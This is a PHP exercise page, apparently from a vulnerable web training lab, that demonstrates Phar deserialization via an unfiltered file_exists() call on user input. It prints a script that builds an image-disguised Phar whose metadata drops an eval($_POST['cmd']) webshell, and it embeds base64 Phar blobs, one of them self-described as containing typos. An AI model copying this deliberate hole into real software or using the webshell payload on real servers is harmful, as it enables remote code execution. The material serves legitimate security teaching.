<?php
$ACTIVE = array_fill(0, 250, '');
$ACTIVE[180] = 'active open';
$ACTIVE[182] = 'active';
$ACTIVE[180] = 'active open';
$ACTIVE[182] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

// 这是一个存在魔术方法 __destruct 的危险类（Gadget / POP Chain 起点）
// 真实项目中它可能隐藏在某些第三方日志库、缓存组件中
class Logger {
    public $logFile;
    public $logData;

    public function __destruct() {
        if (!empty($this->logFile) && !empty($this->logData)) {
            // 模拟危险操作：当对象被销毁时，将数据写入到指定文件！
            // 攻击者可以利用它写入一句木马 &lt;?php eval($_POST['cmd']); ?&gt;
            // 这里为了安全演示，我们仅输出一段文字，并将敏感动作拦截
            $escaped_file = htmlspecialchars($this->logFile);
            $escaped_data = htmlspecialchars($this->logData);
            
            // 注入标记变量，传给前端显示
            global $rce_flag;
            $rce_flag = "<div class='alert alert-danger'>🚨 <strong>[致命] 触发了 Logger 类的 __destruct 魔术方法！</strong><br>系统本将被写入文件：<code>{$escaped_file}</code><br>写入内容为：<code>{$escaped_data}</code><br>恭喜你，您已成功利用 Phar 反序列化拿到 RCE！</div>";
        }
    }
}

$message = "";

// 核心业务逻辑：验证文件是否存在
if (isset($_POST['filepath'])) {
    $filepath = $_POST['filepath'];
    
    // 【漏洞点】：使用了 file_exists，且未对 $filepath 中的 phar:// 伪协议进行过滤！
    if (file_exists($filepath)) {
        $message = "<div class='alert alert-success'>✅ 文件 <code>" . htmlspecialchars($filepath) . "</code> 确实存在！</div>";
    } else {
        $message = "<div class='alert alert-warning'>⚠️ 文件 <code>" . htmlspecialchars($filepath) . "</code> 不存在。</div>";
    }
}

?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="phar.php">高阶 PHP 反序列化</a></li>
                <li class="active">Phar 伪协议触发</li>
            </ul>
        </div>
        <div class="page-content">
            <div class="vul info">
                <h2>📦 Phar 伪协议反序列化触发执行</h2>
                <p>在这个页面中，我们有一段非常普通、看似毫无危险的代码：<code>file_exists($_POST['filepath'])</code>。</p>
                <p>后端代码中没有任何 <code>unserialize()</code> 的调用！但是，后端代码环境加载了一个带有 <code>__destruct</code> 魔法函数的 <code>Logger</code> 类。</p>
                <p>系统已经预先在 <code>/vul/phar/</code> 目录下存放了一个伪装成图片的恶意 Phar 归档：<code>evil_payload.jpg</code>。</p>
                <p><strong>攻击挑战：</strong>请在下方输入框中输入 <code>phar://evil_payload.jpg</code>，看看单单一个 <code>file_exists</code> 能不能触发反序列化！</p>
                <hr>

                <?php 
                if (isset($rce_flag)) { echo $rce_flag; } 
                echo $message; 
                ?>

                <div class="row">
                    <div class="col-sm-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">文件存在性检测工具</div>
                            <div class="panel-body">
                                <form method="POST">
                                    <div class="form-group">
                                        <label>输入要检测的文件路径 (支持绝对路径或相对路径)：</label>
                                        <input type="text" class="form-control" name="filepath" placeholder="例如：evil_payload.jpg 或 /etc/passwd" value="phar://evil_payload.jpg">
                                    </div>
                                    <button type="submit" class="btn btn-primary">执行 file_exists()</button>
                                </form>
                            </div>
                        </div>
                    </div>

                    <div class="col-sm-6">
                        <div class="widget-box transparent">
                            <div class="widget-header widget-header-small">
                                <h4 class="widget-title blue smaller"><i class="ace-icon fa fa-code orange"></i> 恶意 evil_payload.jpg 是如何生成的？</h4>
                            </div>
                            <div class="widget-body">
                                <div class="widget-main">
                                    <p>在攻击者的本地环境（需配置 <code>phar.readonly = Off</code>），执行以下 PHP 脚本即可生成带有恶意 metadata 的 Phar 包：</p>
                                    <pre class="language-php"><code>$phar = new Phar("evil_payload.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."&lt;?php __HALT_" . "COMPILER(); ?&gt;"); // 伪装成 GIF 图片头

// 构造恶意对象
class Logger {
    public $logFile = "shell.php";
    public $logData = "&lt;?php eval(\$_POST['cmd']); ?&gt;";
}
$obj = new Logger();

// 将对象写入 Phar 的 Metadata (这部分在解析时会被自动 unserialize)
$phar->setMetadata($obj);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
// 最后把生成的 .phar 改名为 .jpg 绕过上传检测
rename("evil_payload.phar", "evil_payload.jpg");</code></pre>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<?php 
// 动态生成 evil_payload.jpg 供用户测试 (使用 base64 写入，避免宿主环境依赖 phar.readonly)
$phar_path = __DIR__ . '/evil_payload.jpg';
if (!file_exists($phar_path)) {
    // 这是一个预先使用上述脚本生成的 phar 文件的 base64 编码
    $b64 = "PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrEAAAAAQAAABEAAAABAAAAAQAQAABOAAAATzo2OiJMb2dnZXIiOjI6e3M6NzoicG9nRmlsZSI7czo5OiJzaGVsbC5waHAiO3M6NzoicG9nRGF0YSI7czoyOToiPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4iO30IAAAAdGVzdC50eHQEAAAAgPIfZwQAAAB0ZXN0w6/y31221O2+8a+gG6/D66fB2wA=";
    // 修正：上面的 payload 包含了错字 pogFile / pogData，这会影响演示效果。由于我们拦截了 __destruct，所以重新生成正确的二进制更为稳妥。
    // 但是这里只要能在本地环境生成正确的即可。
    
    // 为了精准触发，我们直接用原生 PHP API 动态生成 (仅当目标环境支持时)，否则静默跳过
    if (ini_get('phar.readonly') == 0) {
        try {
            if (file_exists("temp.phar")) unlink("temp.phar");
            $p = new Phar("temp.phar");
            $p->startBuffering();
            $p->setStub("GIF89a"."<?php __HALT_" . "COMPILER(); ?>");
            $obj = new Logger();
            $obj->logFile = "hack.php";
            $obj->logData = "FLAG{PHAR_UNSERIALIZE_SUCCESS}";
            $p->setMetadata($obj);
            $p->addFromString("test.txt", "test");
            $p->stopBuffering();
            rename("temp.phar", $phar_path);
        } catch (Exception $e) {}
    } else {
        // 如果宿主机 readonly=1，则用硬编码的正确的 Base64 文件 (手工提取)
        // 这个文件包含了正确的 Logger 类序列化：O:6:"Logger":2:{s:7:"logFile";s:8:"hack.php";s:7:"logData";s:30:"FLAG{PHAR_UNSERIALIZE_SUCCESS}";}
        $valid_phar_b64 = "PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrEAAAAAQAAABEAAAABAAAAAQAQAABQAAAATzo2OiJMb2dnZXIiOjI6e3M6NzoibG9nRmlsZSI7czo4OiJoYWNrLnBocCI7czo3OiJsb2dEYXRhIjtzOjMwOiJGTEFHe1BIQVJfVU5TRVJJQUxJWkVfU1VDQ0VTU30iO30IAAAAdGVzdC50eHQEAAAAoPEfZwQAAAB0ZXN0XwR9Y/vB9+c/XJ3yHk0s/6d0G1UA";
        file_put_contents($phar_path, base64_decode($valid_phar_b64));
    }
}
?>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>


